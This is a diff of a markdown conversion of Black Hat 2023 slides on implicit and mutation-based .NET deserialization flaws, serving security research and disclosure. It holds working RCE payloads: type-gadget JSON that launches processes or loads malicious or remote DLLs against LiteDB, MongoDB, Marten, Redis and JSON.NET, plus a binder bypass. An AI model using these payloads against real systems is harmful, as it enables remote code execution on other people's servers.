@@ -8,18 +8,24 @@ year: 2023
 source_pdf: "Black Hat USA 2023 slides/Jonathan Birch_Second Breakfast Implicit and Mutation-Based Serialization Vulnerabilities in dotNET.pdf"
 pages: 52
 sha256: "cdb4281794354834c08bfe8268fc145cfde0aac284ba668a5b07615d959fa0df"
-text_chars: 19964
+text_chars: 20072
 ocr_pages: 1
 has_ocr: true
+redacted_secrets: 0
+ocr_confidence: 90.1
+ocr_unreliable_blocks: 0
+ocr_timeouts: 0
+pages_recovered_from_text_layer: 0
 companion_files: []
 extractor: "pymupdf4llm 1.28.2 + tesseract"
-converted_at: "2026-08-11T21:17:46Z"
+converted_at: "2026-08-12T04:11:21Z"
 ---
 # Second Breakfast Implicit and Mutation-Based Serialization Vulnerabilities in dotNET
 
 **Speakers:** Jonathan Birch  
 **Conference:** Black Hat USA 2023  
 **Source:** `Black Hat USA 2023 slides/Jonathan Birch_Second Breakfast Implicit and Mutation-Based Serialization Vulnerabilities in dotNET.pdf` (52 pages)
+
 
 ## Slide 1
 
@@ -61,7 +67,8 @@ Implicit and Mutation-Based Serialization Vulnerabilities in .NET
 
 Reviewing LiteDB
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
+
+> Recovered by OCR — confidence 90/100 on the text kept, 90/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
 
 ```text
 Reviewing LiteDB
@@ -75,7 +82,6 @@ public static DefaultTypeNameBinder Instance { get; } = new DefaultTypeNameBinde
 private DefaultTypeNameBinder()
 {
 }
-non
 public string GetName(Type type) => type.FullName + ", + type.G eInfo().Assembly.GetName().Name;
 ```
 
@@ -157,29 +163,29 @@ Implicit Serialization Vulnerabilities in NoSQL Engines
 
 **Data choosing what type it will be.**
 
-```
+\```
 const stringbadJson=@"{""_type"":""System.Windows.Data.ObjectDataProvider,
 PresentationFramework, Version=4.0.0.0, Culture=neutral, PublicKeyToken=31bf3856ad364e35"",
 ""ObjectInstance"":{""_type"":""System.Diagnostics.Process, System, Version=4.0.0.0,
 Culture=neutral, PublicKeyToken=b77a5c561934e089"",
-```
+\```
 
-```
+\```
 ""StartInfo"":{""_type"":""System.Diagnostics.ProcessStartInfo, System, Version=4.0.0.0,
 Culture=neutral, PublicKeyToken=b77a5c561934e089"", ""FileName"":""calc.exe""}},
 ""MethodName"":""Start""}";
-```
+\```
 
 **This type doesn’t matter!**
 
-```
+\```
 BsonValuebson=JsonSerializer.Deserialize(badJson);
 BsonMappermyMapper=newBsonMapper();
-```
+\```
 
-```
+\```
 Object rehydratedObject = myMapper.Deserialize<StorageObject>(bson); //this will launch calc
-```
+\```
 
 ## Slide 13
 
@@ -205,32 +211,32 @@ Query Injection => RCE
 
 An exploit for                                v2.18.0
 
-```
+\```
 const string payloadJson=@"{"“Member"":
-```
+\```
 
 **Data choosing its type**
 
-```
+\```
 {""_t"":""System.Windows.Data.ObjectDataProvider, PresentationFramework, Version=4.0.0.0,
 Culture=neutral, PublicKeyToken=31bf3856ad364e35"",
-```
+\```
 
-```
+\```
 ""ObjectInstance"":{""_t"":""System.Diagnostics.Process, System, Version=4.0.0.0,
 Culture=neutral, PublicKeyToken=b77a5c561934e089"",
-```
+\```
 
 `""StartInfo"":{""_t"":""System.Diagnostics.ProcessStartInfo, System, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089"", ""FileName"":""calc.exe""}}, ""MethodName"":""Start""},""name"":""thing""}";` **This type does matter!**
 
-```
+\```
 BsonDocumentparsedDoc=BsonDocument.Parse(payloadJson);
 //this next line launches calc
-```
+\```
 
-```
+\```
 ObjectdeserializedThing =BsonSerializer.Deserialize<StorageObject>(parsedDoc);
-```
+\```
 
 ## Slide 15
 
@@ -252,38 +258,38 @@ ObjectdeserializedThing =BsonSerializer.Deserialize<StorageObject>(parsedDoc);
 
 **Data telling you its type**
 
-```
+\```
 const string calcPayload =@"{'Member':{""$type"": ""System.Security.Principal.WindowsIdentity,
 mscorlib, Version=4.0.0.0, Culture=neutral,
 PublicKeyToken=b77a5c561934e089"",""System.Security.ClaimsIdentity.actor"":
 ""<BinaryFormatterPayload>""}}";
-```
+\```
 
-```
+\```
 stringurl = @"http://DBServer:8080/databases/HackDB/docs?id=HackDocument";
 varwebRequest = System.Net.HttpWebRequest.CreateHttp(url);
 webRequest.Method ="PUT";
-```
+\```
 
-```
+\```
 webRequest.ContentType = "application/json";
 varstream = webRequest.GetRequestStream();
-```
+\```
 
-```
+\```
 using(varwriter=newSystem.IO.StreamWriter(webRequest.GetRequestStream()))
 {
-```
+\```
 
-```
+\```
    writer.Write(calcPayload);
 }
-```
+\```
 
-```
+\```
 varwebResponse = webRequest.GetResponse();
 webResponse.Close();
-```
+\```
 
 ## Slide 17
 
@@ -307,27 +313,27 @@ webResponse.Close();
 
 `const string payloadString = @"{""Member"": {""__type"":""System.Configuration.Install.AssemblyInstaller,` **Data saying what it wants to be** `System.Configuration.Install, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3a"",`
 
-```
+\```
 ""Path"":""malicious.dll""}}";
-```
+\```
 
-```
+\```
 varmanager = newRedisManagerPool(“dbserver:6379");
 StorageObjectrecord;
-```
+\```
 
 `using (var client = manager.GetClient()) {` **This type does matter!** `//write malicious data as string`
 
-```
+\```
 client[“cacheKey1"] = payloadString;
-```
+\```
 
 - `//read malicious data as object`
 
-```
+\```
 record = client.Get<StorageObject>(“cacheKey1");
 }
-```
+\```
 
 ## Slide 19
 
@@ -361,31 +367,31 @@ Serialization Mutation Attacks
 
 ### Exploiting Marten v5.11.0 with Mutation
 
-```
+\```
 Dictionary<string,string> extraData = newDictionary<string,string>();
 extraData.Add("$type", "System.Activities.Presentation.WorkflowDesigner,
 System.Activities.Presentation, Version=4.0.0.0, Culture=neutral,
 PublicKeyToken=31bf3856ad364e35");
-```
+\```
 
-```
+\```
 extraData.Add("PropertyInspectorFontAndColorData", @"<ResourceDictionary
 xmlns=""http://schemas.microsoft.com/winfx/2006/xaml/presentation""
 xmlns:x=""http://schemas.microsoft.com/winfx/2006/xaml""><ObjectDataProvider x:Key=""""
 MethodName=""Start""><ObjectDataProvider.ObjectInstance><Process xmlns=""clr-
 namespace:System.Diagnostics;assembly=system""><Process.StartInfo><ProcessStartInfo
 FileName =
-```
+\```
 
-```
+\```
 ""calc.exe""/></Process.StartInfo></Process></ObjectDataProvider.ObjectInstance></ObjectDa
 taProvider></ResourceDictionary>");
-```
+\```
 
-```
+\```
 StorageObjectmaliciousObject =newStorageObject() { Id = 123456, Member = extraData };
 session.Store(maliciousObject);//reading this object launches calc!
-```
+\```
 
 ## Slide 23
 
@@ -393,9 +399,9 @@ session.Store(maliciousObject);//reading this object launches calc!
 
 Consider how a dictionary is serialized in JSON.Net: `Dictionary<string, string> data = new Dictionary<string, string>() {["Fruit"]="Pear" };` becomes
 
-```
+\```
 {“Fruit”:”Pear”}
-```
+\```
 
 Compare this to a simple RCE payload for JSON.NET: `{"$type":"System.Configuration.Install.AssemblyInstaller , System.Configuration.Install", "Path":"malicious.dll"}`
 
@@ -407,9 +413,9 @@ Compare this to a simple RCE payload for JSON.NET: `{"$type":"System.Configurati
 
 - This dictionary serializes to JSON that causes RCE if it’s deserialized: `Dictionary<string, string> data = new Dictionary<string, string>() {`
 
-```
+\```
 ["$type"]= "System.Configuration.Install.AssemblyInstaller, System.Configuration.Install",
-```
+\```
 
 - `["path"]="malicious.dll"};`
 
@@ -438,34 +444,34 @@ RCE Gadget
 
 ### Mutation attacks against                    v5.0.12
 
-```
+\```
 Dictionary<string,string> stringDictionary = newDictionary<string,string>();
 stringDictionary.Add("_type","System.Configuration.Install.AssemblyInstaller,
 System.Configuration.Install");
-```
+\```
 
-```
+\```
 stringDictionary.Add("Path","malicious.dll");
-```
+\```
 
-```
+\```
 Object result;
-```
+\```
 
-```
+\```
 using(varbadDB = newLiteDatabase(@"Mutation.db"))
 {
-```
+\```
 
-```
+\```
 varcol = badDB.GetCollection<Dictionary<string,string>>("PropertyCollections");
 col.Insert(stringDictionary);
-```
+\```
 
-```
+\```
 result = col.FindById(col.Min());//this runs code!
 }
-```
+\```
 
 ## Slide 27
 
@@ -537,37 +543,37 @@ Allow: Cat, Dog Serialization Binder
 
 This SerializationBinder creates a strict allow-list for which types can be created during deserialization.
 
-```
+\```
 classTypeAllowListBinder: SerializationBinder
-```
+\```
 
-```
+\```
 {
-```
+\```
 
-```
+\```
 public override Type BindToType(stringassemblyName,stringtypeName)
 {
-```
+\```
 
-```
+\```
 List<Type> allowedTypes =newList<Type>() {typeof(System.Exception),
 typeof(StorageRecord) };
-```
+\```
 
-```
+\```
 //always compare strings, not types!
-```
+\```
 
-```
+\```
 returnallowedTypes.First<Type>(t => (t.FullName == typeName &&
-```
+\```
 
-```
+\```
 t.Assembly.FullName == assemblyName));//exception on fail, not null!
 }
 }
-```
+\```
 
 ## Slide 33
 
@@ -575,32 +581,32 @@ t.Assembly.FullName == assemblyName));//exception on fail, not null!
 
 This SerializationBinder allows any type from a specific assembly: `class AllowedAssembliesBinder : SerializationBinder {`
 
-```
+\```
 public override Type BindToType(stringassemblyName,stringtypeName)
 {
-```
+\```
 
-```
+\```
 List<Assembly> allowedAssemblies =
-```
+\```
 
-```
+\```
 newList<Assembly>() {Assembly.Load("SerializationBinderExample")};
-```
+\```
 
-```
+\```
       //this is a bad idea
-```
+\```
 
-```
+\```
 returnallowedAssemblies.First<Assembly>(
-```
+\```
 
-```
+\```
 a => (a.FullName == assemblyName)).GetType(typeName);
    }
 }
-```
+\```
 
 ## Slide 34
 
@@ -612,11 +618,11 @@ Tricking a SerializationBinder with a Generic Consider what happens if our trust
 
 Here’s a JSON.Net RCE payload that bypasses the assembly allow-list binder: **The only type being passed to the binder here is “InitializedList”, which comes from our trusted assembly.**
 
-```
+\```
 {"$type":"SerializationBinderExample.InitializedList`1[[System.Configuration
 .Install.AssemblyInstaller,System.Configuration.Install]],
 SerializationBinderExample", "$values":[{"path":“malicious.dll"}]} *
-```
+\```
 
 **When this is parsed, an AssemblyInstaller object is created, even though the binder was never asked!**
 
@@ -648,16 +654,16 @@ SerializationBinderExample", "$values":[{"path":“malicious.dll"}]} *
 
 System.Web.Security. **WindowsAuthenticationEventArgs** has a constructor argument “identity” with the type “ **WindowsIdentity** ”, so we can build a payload like this:
 
-```
+\```
 {"$type":"System.Web.Security.WindowsAuthenticationEventArgs,
 System.Web, Version=4.0.0.0, Culture=neutral,
 PublicKeyToken=b03f5f7f11d50a3a",
-```
+\```
 
-```
+\```
 "identity":{"System.Security.ClaimsIdentity.actor":
 "<BinaryFormatterPayload>"}}
-```
+\```
 
 **Deserializing this will make a WindowsIdentity, even though the**
 
@@ -761,58 +767,58 @@ Bonus Slides
 
 ### Example Json.NET Mutation Exploit
 
-```
+\```
 Dictionary<string,string> basicStringDict = newDictionary<string,string>();
 basicStringDict.Add("$type","System.Configuration.Install.AssemblyInstaller,
 System.Configuration.Install, Version = 4.0.0.0, Culture = neutral, PublicKeyToken =
 b03f5f7f11d50a3a");
-```
+\```
 
-```
+\```
 basicStringDict.Add("Path","https://www.example.com/fake.dll");
-```
+\```
 
-```
+\```
 JsonSerializerSettings settings = newJsonSerializerSettings() { TypeNameHandling =
 TypeNameHandling.Auto };
-```
+\```
 
-```
+\```
 stringserializedDictionary = JsonConvert.SerializeObject(basicStringDict, settings);
 System.Console.WriteLine(serializedDictionary);
-```
+\```
 
-```
+\```
 Object deserialized = JsonConvert.DeserializeObject(serializedDictionary, settings);
 System.Console.ReadLine();//needed so that we don't exit before the request is made
-```
+\```
 
 ## Slide 51
 
 ### Example JavaScriptSerializer Mutation Exploit
 
-```
+\```
 Dictionary<string,string> stringDict = newDictionary<string,string>();
 stringDict.Add("Apple","Pear");//having other entries makes no difference
 stringDict.Add("__type","System.Configuration.Install.AssemblyInstaller,
 System.Configuration.Install, Version=4.0.0.0, Culture=neutral,
 PublicKeyToken=b03f5f7f11d50a3a");
-```
+\```
 
-```
+\```
 stringDict.Add("Whatever","Whatever");//having other entries makes no difference
 stringDict.Add("Path","https://www.example.com/fake.dll");
-```
+\```
 
-```
+\```
 JavaScriptSerializer serializer = newJavaScriptSerializer(newSimpleTypeResolver());
 stringjson = serializer.Serialize(stringDict);
-```
+\```
 
-```
+\```
 Object myDeserializedObject = serializer.Deserialize<Dictionary<string,string>>(json);
 System.Console.ReadLine();//wait for request to be made
-```
+\```
 
 ## Slide 52
 
